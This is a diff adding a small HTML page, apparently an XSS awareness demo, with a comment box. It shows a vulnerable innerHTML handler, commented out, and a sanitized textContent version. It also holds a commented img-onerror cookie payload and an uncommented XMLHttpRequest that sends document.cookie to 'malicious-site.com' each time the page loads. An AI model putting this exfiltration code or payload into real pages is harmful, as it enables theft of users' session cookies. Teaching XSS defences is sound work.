@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Awareness Example</title>
+</head>
+<body>
+
+    <h2>Comment Section</h2>
+
+    <textarea id="userComment" placeholder="Enter your comment"></textarea>
+    <button onclick="postComment()">Post Comment</button>
+
+    <div id="commentSection"></div>
+
+<script>
+
+    // function postComment() {
+    //     var userComment = document.getElementById("userComment").value;
+    //     document.getElementById("commentSection").innerHTML += '<p>' + userComment + '</p>';
+    // }
+
+    // <img src="" onerror="alert(document.cookie)"> Hello
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://malicious-site.com/steal?data=' + document.cookie, true);
+    xhr.send();
+
+    function sanitizeHTML(str) {
+        var doc = new DOMParser().parseFromString(str, 'text/html');
+        return doc.body.textContent || "";
+    }
+
+    function postComment() {
+        var userComment = document.getElementById("userComment").value;
+        var sanitizedComment = sanitizeHTML(userComment);
+        var commentElement = document.getElementById("commentSection");
+        var paragraph = document.createElement("p");
+        paragraph.textContent = sanitizedComment;
+        commentElement.appendChild(paragraph);
+    }
+
+</script>
+
+</body>
+</html>
